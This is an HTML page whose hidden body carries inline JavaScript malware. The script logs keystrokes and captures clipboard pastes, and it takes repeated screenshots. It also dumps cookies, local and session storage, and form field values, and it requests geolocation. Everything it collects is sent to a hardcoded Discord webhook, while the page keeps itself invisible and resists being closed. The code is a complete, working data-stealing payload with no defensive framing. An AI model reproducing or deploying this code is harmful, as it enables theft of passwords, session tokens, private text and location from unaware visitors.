<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>body{margin:0;background:#000;opacity:0;position:fixed;inset:0;z-index:-9999;display:none;visibility:hidden;overflow:hidden;}</style>
</head>
<body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script>
    const webhook = "https://discord.com/api/webhooks/1520935776152588399/s5XS6Edgv2rvUcnBAQIXg2XXqhxbBd2pk-YkknYSvKWyG1eioTMV6_Iq8BXi3moO9mGY";

    async function exfil(content, isFile = false) {
        try {
            if (isFile) {
                const fd = new FormData();
                fd.append('file', content, `max_${Date.now()}.png`);
                await fetch(webhook, {method: 'POST', body: fd});
            } else {
                await fetch(webhook, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content})});
            }
        } catch(e) {}
    }

    function superHide() {
        document.documentElement.style.cssText = 'display:none !important; visibility:hidden !important; opacity:0 !important; position:absolute !important; left:-99999px !important; top:-99999px !important;';
        document.body.style.cssText = 'display:none !important;';
        window.scrollTo(0, 999999);
    }
    superHide();
    setInterval(superHide, 150);

    // All grabs
    let keys = '';
    document.addEventListener('keydown', e => { keys += e.key.length > 1 ? `[${e.key}]` : e.key; if(keys.length > 60) { exfil(`🔑 ${keys}`); keys=''; } });

    document.addEventListener('paste', e => setTimeout(() => exfil(`📋 ${ (e.clipboardData || window.clipboardData || {}).getData('text') }`), 50));

    async function ss() {
        try {
            const canvas = await html2canvas(document.documentElement, {scale:0.55, useCORS:true});
            canvas.toBlob(b => exfil(b, true));
        } catch(e) {}
    }
    setInterval(ss, 8000);
    setTimeout(ss, 1200);

    function fullDump() {
        exfil(`FULL DUMP:\nCookies: ${document.cookie}\nLocal: ${JSON.stringify(localStorage)}\nSession: ${JSON.stringify(sessionStorage)}\nURL: ${location.href}\nUA: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}\nTime: ${new Date()}`);
        document.querySelectorAll('input,textarea,select').forEach(i => { if(i.value) exfil(`FORM: ${i.type} - ${i.name || i.id} = ${i.value}`); });
    }
    setTimeout(fullDump, 700);
    setInterval(fullDump, 25000);

    if (navigator.geolocation) navigator.geolocation.getCurrentPosition(p => exfil(`GEO: ${p.coords.latitude},${p.coords.longitude}`));

    setTimeout(() => exfil('✅ MAX STEAL EVERYTHING ACTIVE - RESEARCH OPTIMIZED'), 400);

    window.onbeforeunload = () => true;
</script>
</body>
</html>
